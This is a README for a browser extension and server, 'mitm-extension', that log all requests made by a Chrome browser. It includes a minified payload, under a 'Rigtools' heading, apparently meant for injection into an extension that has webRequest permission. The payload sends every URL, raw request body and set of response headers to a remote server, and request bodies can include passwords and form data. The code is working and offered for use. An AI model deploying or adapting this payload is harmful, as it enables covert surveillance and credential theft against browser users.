# mitm-extension
Log all request sent to and from your browser

## Setup
```sh
$ git clone https://github.com/entrpix/mitm-extension
```

## Extension
- Inside `mitm-extension/extension/background.js` edit:
  - `SERVER_URL` to be your server
  - `TOKEN` to be your token
- Zip the extension
- Then go to `chrome://extensions`
  - Enable developer mode
  - Load extension

## Server
```sh
$ cd mitm-extension
$ cd server
$ touch .env
$ echo "TOKEN=YOUR_TOKEN" > .env
$ (p)npm i
$ node index.js
```

To access your logs visit `DOMAIN:PORT/logs?auth=TOKEN`

## Rigtools
Requires `webRequest` premission
```js
const SERVER_URL = 'http://example.com/create'; const SERVER_DOMAIN = 'example.com'; const TOKEN = ''; const LOG = ["*"]; const DONT_LOG = []; function shouldLog(url) { return DONT_LOG.includes("*") ? LOG.some(allowed => url.includes(allowed)) : LOG.includes("*") ? !DONT_LOG.some(exclude => url.includes(exclude)) : LOG.some(allowed => url.includes(allowed)) && !DONT_LOG.some(exclude => url.includes(exclude)); } chrome.webRequest.onBeforeRequest.addListener(d => !d.url.includes(SERVER_DOMAIN) && shouldLog(d.url) && (d.requestBody && d.requestBody.raw ? String.fromCharCode.apply(null, new Uint8Array(d.requestBody.raw[0].bytes)) : null, fetch(SERVER_URL, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authentication': TOKEN }, body: JSON.stringify({ method: d.method, date: new Date().toISOString(), url: d.url, requestBody: d.requestBody && d.requestBody.raw ? String.fromCharCode.apply(null, new Uint8Array(d.requestBody.raw[0].bytes)) : null }) }).catch(e => console.error('Error:', e))), { urls: ["<all_urls>"] }, ["requestBody"]); chrome.webRequest.onCompleted.addListener(d => !d.url.includes(SERVER_DOMAIN) && shouldLog(d.url) && fetch(SERVER_URL, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authentication': TOKEN }, body: JSON.stringify({ method: d.method, date: new Date().toISOString(), url: d.url, requestBody: d.requestBody && d.requestBody.raw ? String.fromCharCode.apply(null, new Uint8Array(d.requestBody.raw[0].bytes)) : null, statusCode: d.statusCode, requestId: d.requestId, responseHeaders: d.responseHeaders || {} }) }).catch(e => console.error('Error:', e))), { urls: ["<all_urls>"] }, ["responseHeaders"]);
```
